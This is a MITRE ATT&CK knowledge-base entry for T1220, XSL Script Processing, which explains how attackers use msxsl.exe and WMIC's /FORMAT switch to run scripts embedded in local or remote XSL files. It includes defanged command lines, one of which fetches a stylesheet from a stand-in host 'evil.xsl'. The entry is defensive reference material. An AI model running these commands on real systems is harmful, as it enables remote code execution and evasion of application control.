---
aliases: 
    - T1220
tags: 
    - attack/domain/enterprise_attack
    - attack/mitigated
    - attack/tactic/stealth
    - attack/type/technique
    - platform/windows
mitre-attack: kb/mitre/attack/techniques/T1220-XSL_Script_Processing
tactic: 
     - Stealth
platforms:
     - Windows
permissions required:
     - none
---

## Description

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [^3] <br><br>Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [[kb/mitre/attack/techniques/T1127-Trusted_Developer_Utilities_Proxy_Execution\|Trusted Developer Utilities Proxy Execution]], the Microsoft common line transformation utility binary (msxsl.exe) [^6]  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [^2]  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [^5]  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[^4] <br><br>Command-line examples:[^2] [^4] <br><br>* `msxsl.exe customers[.]xml script[.]xsl`<br>* `msxsl.exe script[.]xsl script[.]xsl`<br>* `msxsl.exe script[.]jpeg script[.]jpeg`<br><br>Another variation of this technique, dubbed “Squiblytwo”, involves using [[kb/mitre/attack/techniques/T1047-Windows_Management_Instrumentation\|Windows Management Instrumentation]] to invoke JScript or VBScript within an XSL file.[^1]  This technique can also execute local/remote scripts and, similar to its [[kb/mitre/attack/techniques/T1218.010-Regsvr32\|Regsvr32]]/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [[kb/mitre/attack/techniques/T1047-Windows_Management_Instrumentation\|Windows Management Instrumentation]] provided they utilize the /FORMAT switch.[^4] <br><br>Command-line examples:[^4] [^1] <br><br>* Local File: `wmic process list /FORMAT:evil[.]xsl`<br>* Remote File: `wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”`




## Mitigations
| ID | Name | Description |
| --- | --- | --- |
| [[kb/mitre/attack/mitigations/M1038-Execution_Prevention\|M1038]] | Execution Prevention | If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries. |






> [!info]- References
> [^1]: [LOLBAS Wmic](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)

> [^2]: [Penetration Testing Lab MSXSL July 2017](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)

> [^3]: [Microsoft XSLT Script Mar 2017](https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script)

> [^4]: [XSL Bypass Mar 2019](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)

> [^5]: [Reaqta MSXSL Spearphishing MAR 2018](https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/)

> [^6]: [Microsoft msxsl.exe](https://web.archive.org/web/20190508171106/https://www.microsoft.com/en-us/download/details.aspx?id=21714)


